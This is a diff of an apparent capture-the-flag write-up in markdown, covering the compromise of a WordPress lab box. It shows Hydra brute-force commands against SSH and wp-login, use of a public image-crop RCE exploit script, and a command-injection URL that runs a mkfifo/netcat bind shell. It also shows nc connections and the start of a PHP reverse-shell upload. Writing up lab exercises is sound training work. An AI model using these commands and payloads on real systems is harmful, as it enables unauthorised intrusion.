@@ -193,7 +193,7 @@ After a manual test of the few words obtained from the enumetarion we know that 
 > This vulnerability has been modified since it was last analyzed by the NVD. It is awaiting reanalysis which may result in further changes to the information provided.
 
 javascript medium 10.10.63.203:22 "Vulnerable to Terrapin"
-The system is vulnerable to this vulnerability but we need an ssh session active, so this vector is nonviable.
+The system is vulnerable to this vulnerability but we need an ssh session active, so this vector is **nonviable**.
 ## Brute Force to port 22 (fail)
 ```shell
 hydra -t 10 -vV -f -l bjoel -P /usr/share/wordlists/rockyou.txt 10.10.203.209 ssh
@@ -201,7 +201,7 @@ hydra -t 10 -vV -f -l bjoel -P /usr/share/wordlists/rockyou.txt 10.10.203.209 ss
 No results.
 ## Brute force to wp-login
 Using `bjoel` and `kwheel`
-With bjoel we have nothing but with `kwheel` we found the password
+With bjoel we have nothing but with `kwheel` we **found** the password
 ```shell
 hydra -f -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.130.200 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -vV -t 50
 ```
@@ -216,7 +216,7 @@ hydra -f -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.130.200 http-post-f
 
 In the research of vulnerabilities we found this
 https://github.com/hadrian368
-This is just an example image containing the php code on the metadata
+This is just an example image containing the php code on metadata
 ![Pasted image 20240926112923.png|400](/img/user/attachments/Pasted%20image%2020240926112923.png)
 ### Executing the exploit
 Clone the repo and execute the exploit
@@ -226,16 +226,18 @@ cd wordpress_cropimage
 python3 wp_rce.py -t http://blog.thm/ -u kwheel -p xxxxx -m twentytwenty
 ```
 ![Pasted image 20240926113743.png|600](/img/user/attachments/Pasted%20image%2020240926113743.png)
-We can run commands on the system [[RCE\|RCE]]. We have to go the browser or BurpSuite and run `http://blog.thm/rse.php?0=id`
-We don't have a output readable.
-### Testing RCE
-I test if the [[RCE\|RCE]] is working.
+We can run commands on the system [[RCE\|RCE]]. We have to go the browser or BurpSuite and run the payload `http://blog.thm/rse.php?0=id`
+We could don't have an output readable.
+### Testing RCE (optional)
+I tested if the [[RCE\|RCE]] is working.
 On the attacker machine I set an `icmp` listener using `tcpdump`.
 ```shell
 sudo tcpdump ip proto \\icmp -i tun0
 ```
 ![Pasted image 20240926114744.png|500](/img/user/attachments/Pasted%20image%2020240926114744.png)
-On the victim machine, to send a ping (just 2 packets) to my machine, run `http://blog.thm/rse.php?0=ping 10.6.2.59 -c 2/` but to avoid problems the url encoded 
+On the victim machine, to send a ping (just 2 packets) to my machine, run
+`http://blog.thm/rse.php?0=ping 10.6.2.59 -c 2/`
+but to avoid problems the url encoded: 
 `http://blog.thm/rse.php?0=ping+10.6.2.59+-c+2/`
 ![Pasted image 20240926115124.png|500](/img/user/attachments/Pasted%20image%2020240926115124.png)
 Works, we effectively are executing commands on the system.
@@ -244,14 +246,18 @@ After try some revershell with negative results, I decided execute an bind shell
 To run the nc as listener, on the browser or burpSuite go to
 `http://blog.thm/rse.php?0=mkfifo /tmp/f; nc -lvnp 4949 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f/`
 Url encoded.
-`http://blog.thm/rse.php%3f0%3dmkfifo+/tmp/f%3b+nc+-lvnp+4949+<+/tmp/f+|+/bin/sh+>/tmp/f+2>%261%3b+rm+/tmp/f/`
+`http://blog.thm/rse.php?0=mkfifo+/tmp/f%3b+nc+-lvnp+4949+<+/tmp/f+|+/bin/sh+>/tmp/f+2>%261%3b+rm+/tmp/f/`
+Example on Burpsuite
+![Pasted image 20241116145944.png](/img/user/attachments/Pasted%20image%2020241116145944.png)
+Example on browser
+![Pasted image 20241116175643.png](/img/user/attachments/Pasted%20image%2020241116175643.png)
 
-On the attacker machine, connect it.
+On the attacker machine run this to connect to the listener.
 ```shell
-nc 10.10.43.165 4949
+rlwrap nc 10.10.43.165 4949
 ```
 ![Pasted image 20240926115820.png|400](/img/user/attachments/Pasted%20image%2020240926115820.png)
-### Reverse shell php
+### Reverse shell php (optinal)
 We have a shell, now, to get a better revershell I upload a php revershell to the system `rev_shell_1.php`.
 We have the file on our system and run a python server
 ```python
